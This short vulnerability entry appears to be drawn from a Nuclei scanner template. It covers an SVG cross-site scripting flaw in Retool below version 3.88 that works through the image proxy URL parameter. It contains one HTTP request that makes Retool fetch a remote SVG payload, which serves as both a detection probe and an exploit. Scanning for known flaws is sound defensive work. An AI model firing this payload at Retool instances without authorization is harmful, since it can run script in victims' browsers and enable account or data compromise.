# Vulnerability: Retool < 3.88 - SVG Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`retool-svg-xss.yaml`)

## Description
This template checks for SVG Cross-Site Scripting(XSS) vulnerability via the Image Proxy URL parameter in Retool.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /api/imageProxy?url=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg HTTP/1.1
Host: {{Hostname}}
```

